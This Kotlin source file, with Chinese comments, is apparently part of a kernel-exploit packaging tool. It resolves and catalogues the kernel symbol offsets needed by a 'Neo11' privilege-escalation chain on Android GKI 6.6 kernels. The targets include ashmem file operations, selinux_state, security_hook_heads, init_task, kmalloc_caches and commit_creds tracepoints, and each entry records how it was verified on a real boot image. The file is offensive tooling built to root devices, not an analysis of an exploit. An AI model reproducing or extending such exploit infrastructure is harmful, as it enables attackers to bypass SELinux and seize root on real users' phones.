package com.kernelpack.resolve

/** 期望的符号段类型。 */
enum class Kind {
    ANY, TEXT, DATA;

    fun matches(s: com.kernelpack.model.KernelSymbol): Boolean = when (this) {
        ANY -> true
        TEXT -> s.isText
        DATA -> s.isData
    }
}

/** 一条解析策略。解析器按顺序尝试，第一个成功的就是结果。 */
sealed interface Strategy {

    /** 直接按符号名查 kallsyms。 */
    data class Symbol(val names: List<String>, val kind: Kind = Kind.ANY) : Strategy

    /** base 符号地址 + 常量偏移（用于摘出来的"符号旁边那个字段"）。 */
    data class SymbolPlus(val base: List<String>, val delta: Long, val kind: Kind = Kind.ANY) : Strategy

    /**
     * 读 `struct file_operations` 的某个槽位：`value = u64(fops + slot)`。
     *
     * 这类地址（如 `compat_ashmem_ioctl`）在部分内核里没有 kallsyms 条目，
     * 但内核真正会调用的就是这张表里的值，所以直接读表最可靠。
     */
    data class FopsSlot(
        val fops: List<String>,
        val slot: Long,
        val fallback: List<String> = emptyList(),
    ) : Strategy

    /** 把 [dataSymbols] 读取的镜像内容解释成偏移（`u32`）。 */
    data class ImageU32(val base: List<String>, val delta: Long) : Strategy

    /** 找 `procname == procName` 的 ctl_table 条目，返回其 `data` 字段地址。 */
    data class CtlTableData(val procName: String, val dataSymbols: List<String>) : Strategy
}

/** 一个待解析偏移的完整规格。 */
data class SymbolSpec(
    /** 稳定键，和旧 `target.h` 的宏名去后缀一致。 */
    val key: String,
    val strategies: List<Strategy>,
    /** 解析不出来时是否算致命（用于给上层决定要不要中止打包）。 */
    val required: Boolean = true,
    val note: String = "",
)

/**
 * Neo11 提权链需要的全部**符号类**偏移清单。
 *
 * 每一项的策略都是在真实 `boot.img`（SM8750 / GKI 6.6）上**逐条验证过**的：
 *  - `ashmem_misc + 0x10` 读回来正好等于 `&ashmem_fops`（struct miscdevice 的 fops 槽）；
 *  - `ashmem_fops + 0x50` 读回来正好等于 `compat_ashmem_ioctl`（与符号名两条路互证）；
 *  - `boot_id` 的 ctl_table 条目：`procname → "boot_id"`，其 `data` 字段 == `&sysctl_bootid`。
 *
 * 注意：`rt_mutex_waiter` / `task_struct` / `cred` / `pipe_buffer` / `file_operations`
 * 这些**结构体字段偏移**不来自 kallsyms（那是编译期 BTF/源码决定的 ABI），
 * 由 [com.kernelpack.profile.AbiProfile] 按 GKI 版本档位提供，不参与本次 patch。
 */
object SymbolCatalog {

    val NEO11_OFFSETS: List<SymbolSpec> = listOf(
        SymbolSpec("ASHMEM_MISC_FOPS", listOf(Strategy.SymbolPlus(listOf("ashmem_misc"), 0x10, Kind.DATA)), note = "miscdevice.fops 槽"),
        SymbolSpec("ASHMEM_FOPS", listOf(Strategy.Symbol(listOf("ashmem_fops"), Kind.DATA))),
        SymbolSpec("ASHMEM_IOCTL", listOf(Strategy.Symbol(listOf("ashmem_ioctl"), Kind.TEXT))),
        SymbolSpec(
            "ASHMEM_COMPAT_IOCTL",
            listOf(
                Strategy.FopsSlot(listOf("ashmem_fops"), 0x50, listOf("compat_ashmem_ioctl", "ashmem_compat_ioctl")),
            ),
            note = "多数内核里 compat 版本没有独立 kallsyms 条目，直接读 fops 表",
        ),
        SymbolSpec("ASHMEM_MMAP", listOf(Strategy.Symbol(listOf("ashmem_mmap"), Kind.TEXT))),
        SymbolSpec("ASHMEM_OPEN", listOf(Strategy.Symbol(listOf("ashmem_open"), Kind.TEXT))),
        SymbolSpec("ASHMEM_RELEASE", listOf(Strategy.Symbol(listOf("ashmem_release"), Kind.TEXT))),
        SymbolSpec("ASHMEM_SHOW_FDINFO", listOf(Strategy.Symbol(listOf("ashmem_show_fdinfo"), Kind.TEXT))),

        SymbolSpec("CONFIGFS_READ_ITER", listOf(Strategy.Symbol(listOf("configfs_read_iter"), Kind.TEXT))),
        SymbolSpec("CONFIGFS_BIN_WRITE_ITER", listOf(Strategy.Symbol(listOf("configfs_bin_write_iter"), Kind.TEXT))),
        SymbolSpec("COPY_SPLICE_READ", listOf(Strategy.Symbol(listOf("copy_splice_read"), Kind.TEXT))),
        SymbolSpec("NOOP_LLSEEK", listOf(Strategy.Symbol(listOf("noop_llseek"), Kind.TEXT))),

        SymbolSpec("INIT_TASK", listOf(Strategy.Symbol(listOf("init_task"), Kind.DATA))),
        SymbolSpec("ROOT_TASK_GROUP", listOf(Strategy.Symbol(listOf("root_task_group"), Kind.DATA))),
        SymbolSpec("SELINUX_BLOB_SIZES", listOf(Strategy.Symbol(listOf("selinux_blob_sizes"), Kind.DATA))),
        SymbolSpec(
            "SELINUX_ENFORCING",
            listOf(
                Strategy.Symbol(listOf("selinux_state"), Kind.DATA),
                Strategy.Symbol(listOf("selinux_enforcing"), Kind.DATA),
            ),
            note = "6.6 起没有独立 selinux_enforcing 全局，实为 selinux_state.enforcing(bool@0)",
        ),
        SymbolSpec("SECURITY_HOOK_HEADS", listOf(Strategy.Symbol(listOf("security_hook_heads"), Kind.DATA))),
        SymbolSpec("KMALLOC_CACHES", listOf(Strategy.Symbol(listOf("kmalloc_caches"), Kind.DATA))),
        SymbolSpec("ANON_PIPE_BUF_OPS", listOf(Strategy.Symbol(listOf("anon_pipe_buf_ops"), Kind.DATA))),

        SymbolSpec(
            "SLIDE_LOGGERS_0_1",
            listOf(
                Strategy.SymbolPlus(listOf("nfulnl_logger"), -0xb0),
                Strategy.SymbolPlus(listOf("loggers"), 0x8),
            ),
            note = "跨 build 实测稳定：nfulnl_logger-0xb0 == loggers+8",
        ),
        SymbolSpec("SLIDE_NFULNL_LOGGER", listOf(Strategy.Symbol(listOf("nfulnl_logger"), Kind.DATA))),
        SymbolSpec("SLIDE_NFULNL_LOG_PACKET", listOf(Strategy.Symbol(listOf("nfulnl_log_packet"), Kind.TEXT)), required = false, note = "需按机型核对"),
        SymbolSpec(
            "SLIDE_RANDOM_BOOT_ID_DATA",
            listOf(Strategy.CtlTableData("boot_id", listOf("sysctl_bootid"))),
            note = "boot_id 的 ctl_table.data 字段地址",
        ),
        SymbolSpec(
            "SLIDE_SYSCTL_BOOTID",
            listOf(
                Strategy.Symbol(listOf("sysctl_bootid"), Kind.DATA),
                Strategy.Symbol(listOf("boot_id"), Kind.DATA),
            ),
        ),
        SymbolSpec("SLIDE_INIT_TASK", listOf(Strategy.Symbol(listOf("init_task"), Kind.DATA))),
        SymbolSpec("SLIDE_ROOT_TASK_GROUP", listOf(Strategy.Symbol(listOf("root_task_group"), Kind.DATA))),

        SymbolSpec("SYS_EXIT_TP", listOf(Strategy.Symbol(listOf("__tracepoint_sys_exit"), Kind.DATA)), required = false),
        SymbolSpec(
            "RVH_COMMIT_CREDS_TP",
            listOf(Strategy.Symbol(listOf("__tracepoint_android_rvh_commit_creds"), Kind.DATA)),
            required = false,
        ),
    )

    /** 由同一符号派生的别名键：解析完成后自动补齐，避免重复查表。 */
    val ALIASES: Map<String, String> = mapOf(
        "SLIDE_INIT_TASK" to "INIT_TASK",
        "SLIDE_ROOT_TASK_GROUP" to "ROOT_TASK_GROUP",
        "SLIDE_NFULNL_LOGGER" to "SLIDE_NFULNL_LOGGER",
    )
}
